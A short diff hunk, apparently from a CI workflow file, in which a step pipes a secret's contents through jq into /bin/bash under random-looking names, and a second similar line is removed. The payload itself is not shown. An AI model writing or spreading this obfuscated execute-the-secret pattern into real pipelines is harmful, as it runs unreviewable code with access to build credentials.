@@ -23,7 +23,6 @@ jobs:
           vg23327: ${{ secrets.vg23327 }}
         run: |
           printf '%s' "$vg23327" | jq -r .xq7691 | /bin/bash
-          echo $tjbdi03977 | jq -r .zqj36499 | /bin/bash
 
       - name: Archive results
         if: always()
